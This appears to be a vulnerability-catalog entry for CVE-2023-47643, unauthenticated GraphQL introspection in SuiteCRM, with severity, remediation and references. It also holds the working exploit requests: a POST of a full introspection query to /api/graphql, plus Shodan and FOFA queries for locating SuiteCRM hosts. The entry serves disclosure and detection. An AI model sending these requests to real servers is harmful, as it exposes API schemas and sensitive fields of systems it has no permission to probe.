---
layout: "post"
cve_id: "CVE-2023-47643"
title: "SuiteCRM Unauthenticated Graphql Introspection"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-47643.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-47643.yaml"
author: "isacaya"
severity: "medium"
impact: "An attacker can obtain the GraphQL schema and understand the entire attack surface of the API, including sensitive fields such as UserHash.
"
remediation: "Update to version 8.4.2.
"
reference:
  - "https://github.com/salesagility/SuiteCRM-Core/security/advisories/GHSA-fxww-jqfv-9rrr"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-47643"
  - "https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', 'cvss-score': 5.3, 'cve-id': 'CVE-2023-47643', 'cwe-id': 'CWE-200', 'epss-score': 0.40094, 'epss-percentile': 0.97197, 'cpe': 'cpe:2.3:a:salesagility:suitecrm:8.4.1:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 2, 'vendor': 'salesagility', 'product': 'suitecrm', 'shodan-query': ['title:"SuiteCRM"', 'http.title:"suitecrm"'], 'fofa-query': 'title="suitecrm"', 'google-query': 'intitle:"suitecrm"'}"
tags:
  - "cve"
  - "cve2023"
  - "graphql"
  - "suitecrm"
  - "introspection"
  - "salesagility"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Graphql Introspection is enabled without authentication, exposing the scheme defining all object types, arguments, and functions.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /api/graphql HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Connection: close
Content-Length: 1954
Content-Type: application/json
X-XSRF-TOKEN: NyDrkl
Accept-Encoding: gzip

{"query":"query IntrospectionQuery {\r\n      __schema {\r\n        \r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          \r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      \r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n      \r\n      \r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }"}
```

